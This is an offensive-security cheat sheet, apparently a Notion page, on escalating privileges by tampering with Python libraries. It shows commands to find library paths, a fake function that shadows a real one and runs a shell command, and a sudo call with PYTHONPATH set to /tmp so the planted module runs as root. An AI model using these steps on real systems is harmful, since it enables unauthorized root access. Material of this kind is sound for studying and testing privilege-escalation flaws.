# Python: Library Tampering

OS: Linux, Python
Description: Python: Print the library path
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21)

### Print the python library path

```jsx
python3 -c 'import sys; print("\n".join(sys.path))'
```

### Show imported library current path

```jsx
pip3 show IMPORTED_LIBRARY
```

### Hijack used function with something like

```jsx
import os

def virtual_memory():
    os.system('id')
```

### Manually configure python path at runtime

- Would require sudoers python3

```jsx
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```